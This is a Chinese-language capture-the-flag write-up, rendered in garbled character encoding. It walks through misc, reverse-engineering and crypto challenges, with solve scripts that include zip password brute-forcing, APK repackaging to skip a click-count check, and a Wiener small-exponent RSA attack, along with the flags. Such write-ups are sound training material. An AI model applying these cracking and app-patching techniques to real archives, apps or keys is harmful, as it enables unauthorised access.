sysdrwxrwxrwt 1 root root 4096 Dec 21 2021 tmpdrwxr-xr-x 1 root root 4096 Dec 20 2021 usrdrwxr-xr-x 1 root root 4096 Dec 21 2021 var å‘ç°å•Šflagåå­—.ffffllllllll11111144444GGGGGG å¯åŠ¨è¿‡æ»¤å™¨frame contains ffffllllllll11111144444GGGGGGï¼Œè¿½è¸ªHTTPæµï¼Œçœ‹åˆ°flagçš„ä¸¤æ¬¡base64ç¼–ç ï¼šWm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=ï¼Œbase64è§£å¯†ä¸¤æ¬¡å¾—åˆ°ï¼šflag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125; å‹ç¼©åŒ…ä»¬ä¸‹è½½åå‘ç°æ‰“ä¸å¼€ ä½¿ç”¨binwalkï¼Œbinwalk -e task_1 ï¼Œå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œbandizipæ‰“å¼€å‘ç°base64ç¼–ç çš„æ³¨é‡ŠSSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==ï¼Œbase64è§£å¯†åå¾—åˆ°I like six-digit numbers because they are very concise and easy to remember.ï¼Œæ‹¿çˆ†ç ´å·¥å…·ç›´æ¥çˆ†ç ´å¯†ç ï¼Œå¾—åˆ°232311ï¼Œæ‹¿åˆ°flagï¼šflag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125; ç©ºç™½æ ¼ä¸‹è½½åå‘ç°éƒ½æ˜¯ç©ºæ ¼ã€Tabå’Œæ¢è¡Œï¼Œè”æƒ³åˆ°WhiteSpaceè¯­è¨€ï¼Œåœ¨ç½‘ä¸Šéšä¾¿æ‰¾ä¸€ä¸ªWhiteSpaceåœ¨çº¿è¿è¡Œç¯å¢ƒwhitespaceåœ¨çº¿è¿è¡Œ,åœ¨çº¿å·¥å…·ï¼Œåœ¨çº¿ç¼–è¯‘IDE_w3cschoolï¼Œè¿è¡Œå¾—åˆ°flagï¼šflag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125; Reverseè§£é¢˜ 7&#x2F;8 easy_REä¸‹è½½ç¨‹åºï¼Œæ‹–åˆ°idaé‡Œé¢æ‰“å¼€ï¼Œèƒ½çœ‹è§flagçš„å‰åŠéƒ¨åˆ†flag&#123;we1c0m F5åç¼–è¯‘ï¼Œçœ‹åˆ°ååŠéƒ¨åˆ†e_to_rev3rse!!&#125;ï¼Œå¾—åˆ°å®Œæ•´flagï¼šflag&#123;we1c0me_to_rev3rse!!&#125; å’³Upxè„±å£³upx -d KE.exe åç¼–è¯‘ä»£ç  1234567891011121314151617181920212223242526int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned __int64 i; // r10 char *v4; // kr00_8 char Str1[96]; // [rsp+20h] [rbp-88h] BYREF int v7; // [rsp+80h] [rbp-28h] _main(); memset(Str1, 0, sizeof(Str1)); v7 = 0; Hello(); scanf(&quot;%s&quot;, Str1); for ( i = 0i64; ; ++i ) &#123; v4 = &amp;Str1[strlen(Str1)]; if ( i &gt;= v4 - Str1 ) break; ++Str1[i]; &#125; if ( !strncmp(Str1, enc, v4 - Str1) ) puts(&quot;WOW!!&quot;); else puts(&quot;I believe you can do it!&quot;); system(&quot;pause&quot;); return 0;&#125; å…¶ä¸­encæ˜¯gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~ï¼Œ å†™ä¸€ä¸ªpythonè„šæœ¬è§£å¯† 123a=&#x27;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&#x27;for i in a: print(chr(ord(i)-1),end=&#x27;&#x27;) å¾—åˆ°flagï¼šflag&#123;C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1&#125; Segmentsä¸‹è½½é™„ä»¶ï¼Œæ‹–åˆ°idaé‡Œï¼Œæç¤ºshift+F7ï¼Œç›´æ¥æŒ‰ï¼Œå‘ç°æ®µåå­—ä¸­è—ç€flag flag&#123;You_ar3_g0od_at_f1nding_ELF_segments_name&#125; ELFåç¼–è¯‘ï¼Œå¾—åˆ°cä»£ç ï¼š 1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // edx char *s1; // [rsp+0h] [rbp-20h] char *v6; // [rsp+8h] [rbp-18h] char *s; // [rsp+10h] [rbp-10h] s = (char *)malloc(0x64uLL); printf(&quot;Input flag: &quot;); fgets(s, 100, stdin); s[strcspn(s, &quot;\\n&quot;)] = 0; v6 = (char *)encode(s); v3 = strlen(v6); s1 = (char *)base64_encode(v6, v3); if ( !strcmp(s1, &quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;) ) puts(&quot;Correct&quot;); else puts(&quot;Wrong&quot;); free(v6); free(s1); free(s); return 0;&#125; å‘ç°base64ï¼Œå¯¹å­—ç¬¦ä¸²è¿›è¡Œè§£å¯† å¾—åˆ°V\\QWkt $_e&#39;^_ggXQ&#39;u|v!c/m åˆ†æencodeå‡½æ•°ï¼š 12345678910111213141516171819_BYTE *__fastcall encode(const char *a1)&#123; size_t v1; // rax int v2; // eax _BYTE *v4; // [rsp+20h] [rbp-20h] int i; // [rsp+28h] [rbp-18h] int v6; // [rsp+2Ch] [rbp-14h] v1 = strlen(a1); v4 = malloc(2 * v1 + 1); v6 = 0; for ( i = 0; i &lt; strlen(a1); ++i ) &#123; v2 = v6++; v4[v2] = (a1[i] ^ 0x20) + 16; &#125; v4[v6] = 0; return v4;&#125; å†™å‡ºpythonè§£å¯†è„šæœ¬ 12345a=&#x27;V\\QWkt $_e\\&#x27;^_ggXQ\\&#x27;u|v!c/m&#x27;b=&#x27;&#x27;for i in a: b+=chr((ord(i)-16)^0x20)print(b) å¾—åˆ°flagï¼šflag&#123;D04ou7nowwha7ELF1s?&#125; Endianåç¼–è¯‘ï¼Œå¾—åˆ°ï¼š 1234567891011121314151617181920212223int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // [rsp+4h] [rbp-3Ch] char *v5; // [rsp+8h] [rbp-38h] char v6[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v7; // [rsp+38h] [rbp-8h] v7 = __readfsqword(0x28u); puts(&quot;please input your flag&quot;); __isoc99_scanf(&quot;%s&quot;, v6); v5 = v6; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( *(_DWORD *)v5 != (array[i] ^ 0x12345678) ) &#123; printf(&quot;wrong!&quot;); exit(0); &#125; v5 += 4; &#125; printf(&quot;you are right&quot;); return 0;&#125; å…¶ä¸­arrayä¸ºdd 75553A1Eh, 7B583A03h, 4D58220Ch, 7B50383Dh, 736B3819h, 0ï¼Œshift+eæå–æ•°ç»„å…ƒç´ ï¼Œå†™å‡ºpythonè„šæœ¬ 123456789101112arrr=[ 1968519710, 2069379587, 1297621516, 2068854845, 1936406553, 0 ]for i in arrr: h=((i^0x12345678)) value = h nums = [] while value &gt; 0: nums.append(hex(value &amp; 0xFF)) # å–å‡ºä½ä½éƒ¨åˆ†ï¼Œå¹¶è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸² value &gt;&gt;= 8 # å³ç§»8ä½ï¼Œè·å–ä¸‹ä¸€ä¸ªä½ç½®çš„éƒ¨åˆ† nums_str = [chr(int(num,16)) for num in nums] result_str = &#x27;&#x27;.join(nums_str) print(result_str,end=&#x27;&#x27;) æ‰§è¡Œæ‹¿åˆ°flagï¼šflag&#123;llittl_Endian_axV4 ä¿®æ”¹ä¸€ä¸‹å¾—åˆ°æœ€åflagï¼šflag&#123;llittl_Endian_a&#125; AndroXorAndroid killeræ‰“å¼€ï¼Œjavaåç¼–è¯‘ï¼Œå…¥å£å¤„com.chick.androxor.MainActivityå¾—åˆ°å…³é”®å‡½æ•°ï¼š 1234567891011121314151617181920212223public String Xor(String paramString1, String paramString2) &#123; char[] arrayOfChar = new char[paramString1.length()]; int i = paramString1.length(); String str1 = &quot;wrong!!!&quot;; String str2; if (i != 25) &#123; str2 = &quot;wrong!!!&quot;; &#125; else &#123; str2 = &quot;you win!!!&quot;; &#125; for (i = 0; i &lt; paramString1.length(); i++) &#123; int j = (char)(paramString1.charAt(i) ^ paramString2.charAt(i % paramString2.length())); arrayOfChar[i] = ((char)j); if (new char[] &#123; 14, 13, 17, 23, 2, 75, 73, 55, 32, 30, 20, 73, 10, 2, 12, 62, 40, 64, 11, 39, 75, 89, 25, 65, 13 &#125;[i] != j) &#123; str2 = str1; break; &#125; &#125; return str2; &#125; åœ¨com.chick.androxor.MainActivity$1ç±»ä¸­å¾—åˆ°keyä¸ºhappyx3 1234567public void onClick(View paramView) &#123; String str = this.val$password.getText().toString(); paramView = this.this$0; Toast.makeText(paramView, paramView.Xor(str, &quot;happyx3&quot;), 1).show(); Log.d(&quot;è¾“å…¥&quot;, this.val$password.getText().toString()); &#125; ç¼–å†™pythonè„šæœ¬ 12345678key = &quot;happyx3&quot;cipher = [14, 13, 17, 23, 2, 75, 73, 55, 32, 30, 20, 73, 10, 2, 12, 62, 40, 64, 11, 39, 75, 89, 25, 65, 13]result = &quot;&quot;for i in range(len(cipher)): result += chr(cipher[i] ^ ord(key[i % len(key)]))print(result) å¾—åˆ°flagï¼šflag&#123;3z_And0r1d_X0r_x1x1&#125; lazy_activtiyå®‰è£…apkåæ‰“å¼€å‘ç°è¦æ±‚æˆ‘ä»¬æ‰“å¼€å¦ä¸€ä¸ªActivityæ¥è·å¾—flag æŸ¥çœ‹apké…ç½®æ–‡ä»¶AndroidManifest.xml 1234567891011&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:compileSdkVersion=&quot;32&quot; android:compileSdkVersionCodename=&quot;12&quot; package=&quot;com.droidlearn.activity_travel&quot; platformBuildVersionCode=&quot;32&quot; platformBuildVersionName=&quot;12&quot;&gt; &lt;application android:allowBackup=&quot;true&quot; android:appComponentFactory=&quot;androidx.core.app.CoreComponentFactory&quot; android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot; android:fullBackupContent=&quot;@xml/backup_rules&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/Theme.Activity_Travel&quot;&gt; &lt;activity android:exported=&quot;false&quot; android:name=&quot;com.droidlearn.activity_travel.FlagActivity&quot;/&gt; &lt;activity android:exported=&quot;true&quot; android:name=&quot;com.droidlearn.activity_travel.MainActivity&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; å°†å…¥å£å¤„æ”¹ä¸ºFlagActivityï¼Œå¹¶ä¸”æŠŠFlagActivityçš„exportedæ”¹ä¸ºtrue æ”¹åxmlæ–‡ä»¶å¦‚ä¸‹ 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:compileSdkVersion=&quot;32&quot; android:compileSdkVersionCodename=&quot;12&quot; package=&quot;com.droidlearn.activity_travel&quot; platformBuildVersionCode=&quot;32&quot; platformBuildVersionName=&quot;12&quot;&gt; &lt;application android:allowBackup=&quot;true&quot; android:appComponentFactory=&quot;androidx.core.app.CoreComponentFactory&quot; android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot; android:fullBackupContent=&quot;@xml/backup_rules&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot; android:supportsRtl=&quot;true&quot; android:theme=&quot;@style/Theme.Activity_Travel&quot;&gt; &lt;activity android:exported=&quot;true&quot; android:name=&quot;com.droidlearn.activity_travel.FlagActivity&quot;/&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt; &lt;/intent-filter&gt; &lt;activity android:exported=&quot;true&quot; android:name=&quot;com.droidlearn.activity_travel.MainActivity&quot;&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; é‡æ–°ç¼–è¯‘åæ‰“å¼€ï¼Œå‘ç°è¦æ±‚ç‚¹å‡»æŒ‰é’®10000æ¬¡æ‰èƒ½è·å¾—flagã€‚ åˆ†æsmaliè¯­å¥ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899.class Lcom/droidlearn/activity_travel/FlagActivity$1;.super Ljava/lang/Object;.source &quot;FlagActivity.java&quot;# interfaces.implements Landroid/view/View$OnClickListener;# annotations.annotation system Ldalvik/annotation/EnclosingMethod; value = Lcom/droidlearn/activity_travel/FlagActivity;-&gt;onCreate(Landroid/os/Bundle;)V.end annotation.annotation system Ldalvik/annotation/InnerClass; accessFlags = 0x0 name = null.end annotation# instance fields.field final synthetic this$0:Lcom/droidlearn/activity_travel/FlagActivity;.field final synthetic val$str:Landroid/widget/EditText;.field final synthetic val$tv_cnt:Landroid/widget/TextView;# direct methods.method constructor &lt;init&gt;(Lcom/droidlearn/activity_travel/FlagActivity;Landroid/widget/TextView;Landroid/widget/EditText;)V .locals 0 .line 20 iput-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;this$0:Lcom/droidlearn/activity_travel/FlagActivity; iput-object p2, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;val$tv_cnt:Landroid/widget/TextView; iput-object p3, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;val$str:Landroid/widget/EditText; invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V return-void.end method# virtual methods.method public onClick(Landroid/view/View;)V .locals 2 .line 23 iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;val$tv_cnt:Landroid/widget/TextView; iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;this$0:Lcom/droidlearn/activity_travel/FlagActivity; invoke-static &#123;v0&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$004(Lcom/droidlearn/activity_travel/FlagActivity;)I move-result v0 invoke-static &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String; move-result-object v0 invoke-virtual &#123;p1, v0&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V .line 24 iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;this$0:Lcom/droidlearn/activity_travel/FlagActivity; invoke-static &#123;p1&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$000(Lcom/droidlearn/activity_travel/FlagActivity;)I move-result p1 const/16 v0, 0x2710 if-lt p1, v0, :cond_0 .line 25 iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;this$0:Lcom/droidlearn/activity_travel/FlagActivity; iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$1;-&gt;val$str:Landroid/widget/EditText; invoke-virtual &#123;v0&#125;, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable; move-result-object v0 invoke-virtual &#123;v0&#125;, Ljava/lang/Object;-&gt;toString()Ljava/lang/String; move-result-object v0 const/4 v1, 0x0 invoke-static &#123;p1, v0, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast; move-result-object p1 invoke-virtual &#123;p1&#125;, Landroid/widget/Toast;-&gt;show()V :cond_0 return-void.end method å‘ç°å…¶ä¸­çš„const/16 v0, 0x2710ï¼Œå…¶å­˜å‚¨ä¸ºç‚¹å‡»æ¬¡æ•°ï¼Œå°†å…¶æ”¹ä¸º0x1ï¼Œé‡æ–°ç¼–è¯‘å®‰è£…ï¼Œæ‰“å¼€åç‚¹å‡»æŒ‰é’®ç›´æ¥å¾—åˆ°flag flag&#123;Act1v1ty_!s_so00oo0o_lmpor#an#&#125; Cryptoè§£é¢˜ 10&#x2F;10 brainfuckä¸‹è½½é™„ä»¶ï¼Œå¾—åˆ° 1++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++.&gt;----.&lt;-----.&gt;-----.&gt;-----.&lt;&lt;&lt;-.&gt;&gt;++..&lt;.&gt;.++++++.....------.&lt;.&gt;.&lt;&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;+++++++.&gt;&gt;&gt;+.&lt;&lt;&lt;-------.&gt;&gt;&gt;-.&lt;&lt;&lt;+.+++++++.--..&gt;&gt;&gt;&gt;---.-.&lt;&lt;&lt;&lt;-.+++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-------.+.&gt;&gt;&gt;&gt;&gt;++. Brainfuck&#x2F;OoKåŠ å¯†è§£å¯† - Bugku CTFï¼Œè§£å¯†ä¸€ä¸‹ï¼Œå¾—åˆ°flagï¼šflag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125; Caesarâ€™s Secertæ‰“å¼€é™„ä»¶ï¼Œå¾—åˆ°kqfl&#123;hf3x4w&#39;x_h1umjw_n5_a4wd_3fed&#125; å‡¯æ’’æšä¸¾å‡¯æ’’(Caesar)åŠ å¯†&#x2F;è§£å¯† - Bugku CTFï¼Œå¾—åˆ°flagï¼šflag&#123;ca3s4r&#39;s_c1pher_i5_v4ry_3azy&#125; Fenceé™„ä»¶å†…å®¹ï¼šfa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3 æ …æ åŠ å¯†æ …æ åŠ å¯†&#x2F;è§£å¯† - Bugku CTFï¼Œæšä¸¾è§£å¯†ï¼Œå¾—åˆ°flagï¼šflag&#123;reordering_the_plaintext#686f8c03&#125; VigenÃ¨reé™„ä»¶ï¼špqcq&#123;qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0&#125; ç»´å‰å°¼äºšè§£å¯†ç»´å‰å°¼äºšåŠ å¯†&#x2F;è§£å¯† - Bugku CTFï¼Œå¯†é’¥ç”¨flagå‰4ä¸ªå­—æ¯å°è¯•ä¸€ä¸‹å¾—åˆ°ï¼šKFC å¾—åˆ°flagï¼šflag&#123;la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0&#125; babyrsaæ‰“å¼€é™„ä»¶ 123456789101112131415161718192021from Crypto.Util.number import *from flag import flagdef gen_prime(n): res = 1 for i in range(15): res *= getPrime(n) return resif __name__ == &#x27;__main__&#x27;: n = gen_prime(32) e = 65537 m = bytes_to_long(flag) c = pow(m,e,n) print(n) print(c)# 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261# 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595 ä½¿ç”¨å¤§æ•´æ•°åˆ†è§£ç½‘ç«™factordb.comï¼Œå°†å…¶åˆ†è§£ä¸ºå¤šä¸ªè´¨æ•°ä¹‹ç§¯ 11729006607...61&lt;143&gt; = 2217990919&lt;10&gt; Â· 2338725373&lt;10&gt; Â· 2370292207&lt;10&gt; Â· 2463878387&lt;10&gt; Â· 2706073949&lt;10&gt; Â· 2794985117&lt;10&gt; Â· 2804303069&lt;10&gt; Â· 2923072267&lt;10&gt; Â· 2970591037&lt;10&gt; Â· 3207148519&lt;10&gt; Â· 3654864131&lt;10&gt; Â· 3831680819&lt;10&gt; Â· 3939901243&lt;10&gt; Â· 4093178561&lt;10&gt; Â· 4278428893&lt;10&gt; è§£å¯† 1234567891011121314151617181920212223from Crypto.Util.number import inversen = 2217990919 * 2338725373 * 2370292207 * 2463878387 * 2706073949 * 2794985117 * 2804303069 * 2923072267 * 2970591037 * 3207148519 * 3654864131 * 3831680819 * 3939901243 * 4093178561 * 4278428893e = 65537c = 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595# å°è¯•åˆ†è§£ nfactors = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]# è®¡ç®— phi(n)phi_n = 1for factor in factors: phi_n *= (factor - 1)# è®¡ç®—ç§é’¥ dd = inverse(e, phi_n)# è§£å¯†å¯†æ–‡å¾—åˆ°æ˜æ–‡m = pow(c, d, n)# å°†æ˜æ–‡è½¬æ¢ä¸ºå­—èŠ‚å½¢å¼flag = m.to_bytes((m.bit_length() + 7) // 8, &#x27;big&#x27;)print(flag) Small dæ‰“å¼€é™„ä»¶pyä»£ç ï¼š 1234567891011121314151617181920from secret import flagfrom Crypto.Util.number import *p = getPrime(1024)q = getPrime(1024)d = getPrime(32)e = inverse(d, (p-1)*(q-1))n = p*qm = bytes_to_long(flag)c = pow(m,e,n)print(c)print(e)print(n)# c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248# e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825# n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433 çœ‹åˆ°dæ•°å€¼æ¯”è¾ƒå°ï¼Œä½¿ç”¨ä½è§£å¯†æŒ‡æ•°æ”»å‡» 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150import gmpy2from Crypto.PublicKey import RSAfrom Crypto.Util.number import long_to_bytesdef rational_to_contfrac(x,y): &#x27;&#x27;&#x27; Converts a rational x/y fraction into a list of partial quotients [a0, ..., an] &#x27;&#x27;&#x27; a = x//y pquotients = [a] while a * y != x: x,y = y,x-a*y a = x//y pquotients.append(a) return pquotientsdef convergents_from_contfrac(frac): &#x27;&#x27;&#x27; computes the list of convergents using the list of partial quotients &#x27;&#x27;&#x27; convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0:i])) return convsdef contfrac_to_rational (frac): &#x27;&#x27;&#x27;Converts a finite continued fraction [a0, ..., an] to an x/y rational. &#x27;&#x27;&#x27; if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2,-len(frac)-1,-1): num, denom = frac[_]*num+denom, num return (num,denom)def egcd(a,b): &#x27;&#x27;&#x27; Extended Euclidean Algorithm returns x, y, gcd(a,b) such that ax + by = gcd(a,b) &#x27;&#x27;&#x27; u, u1 = 1, 0 v, v1 = 0, 1 while b: q = a // b u, u1 = u1, u - q * u1 v, v1 = v1, v - q * v1 a, b = b, a - q * b return u, v, adef gcd(a,b): &#x27;&#x27;&#x27; 2.8 times faster than egcd(a,b)[2] &#x27;&#x27;&#x27; a,b=(b,a) if a&lt;b else (a,b) while b: a,b=b,a%b return adef modInverse(e,n): &#x27;&#x27;&#x27; d such that de = 1 (mod n) e must be coprime to n this is assumed to be true &#x27;&#x27;&#x27; return egcd(e,n)[0]%ndef totient(p,q): &#x27;&#x27;&#x27; Calculates the totient of pq &#x27;&#x27;&#x27; return (p-1)*(q-1)def bitlength(x): &#x27;&#x27;&#x27; Calculates the bitlength of x &#x27;&#x27;&#x27; assert x &gt;= 0 n = 0 while x &gt; 0: n = n+1 x = x&gt;&gt;1 return ndef isqrt(n): &#x27;&#x27;&#x27; Calculates the integer square root for arbitrary large nonnegative integers &#x27;&#x27;&#x27; if n &lt; 0: raise ValueError(&#x27;square root not defined for negative numbers&#x27;) if n == 0: return 0 a, b = divmod(bitlength(n), 2) x = 2**(a+b) while True: y = (x + n//x)//2 if y &gt;= x: return x x = ydef is_perfect_square(n): &#x27;&#x27;&#x27; If n is a perfect square it returns sqrt(n), otherwise returns -1 &#x27;&#x27;&#x27; h = n &amp; 0xF; #last hexadecimal &quot;digit&quot; if h &gt; 9: return -1 # return immediately in 6 cases out of 16. # Take advantage of Boolean short-circuit evaluation if ( h != 2 and h != 3 and h != 5 and h != 6 and h != 7 and h != 8 ): # take square root if you must t = isqrt(n) if t*t == n: return t else: return -1 return -1def wiener_hack(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr &gt;= 0): t = is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print(&quot;Hacked!&quot;) return d return Falsedef main(): n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433 e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825 c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248 d = wiener_hack(e, n) m = pow(c,d,n) print (long_to_bytes(m))if __name__==&quot;__main__&quot;: main() æ‹¿åˆ°flagï¼šflag&#123;learn_some_continued_fraction_technique#dc16885c&#125; babyxoræ‰“å¼€é™„ä»¶ï¼Œå¾—åˆ°ä¸€æ®µpythonï¼š 123456789from secret import *ciphertext = []for f in flag: ciphertext.append(f ^ key)print(bytes(ciphertext).hex())# e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2 ç”±äºå·²çŸ¥flagæ˜¯flag&#123;å¼€å¤´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°keyçš„å€¼ï¼Œç¼–å†™è§£å¯†è„šæœ¬ï¼š 123456789101112131415ciphertext_hex = &#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;# å°†16è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚åˆ—è¡¨ciphertext_bytes = bytes.fromhex(ciphertext_hex)# è§£å¯†å¯†æ–‡plaintext = []for c in ciphertext_bytes: print(chr(ord(chr(c))^143),end=&#x27;&#x27;) #plaintext.append(c ^ key)# å°†å­—èŠ‚åˆ—è¡¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²plaintext_str = &#x27;&#x27;.join([chr(p) for p in plaintext])print(plaintext_str) å¾—åˆ°flagï¼šflag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125; babyencodingä½¿ç”¨cyberchefï¼Œç¬¬ä¸€æ®µå¾—åˆ°flag&#123;dazzling_encoding#4e0ad4ï¼Œç¬¬äºŒæ®µå¾—åˆ°ï¼šf0ca08d1e1d0f10c0c7afe422fea7ï¼Œç¬¬ä¸‰æ®µä½¿ç”¨UUencodeè§£å¯†UUencodeåŠ å¯†&#x2F;è§£å¯† - 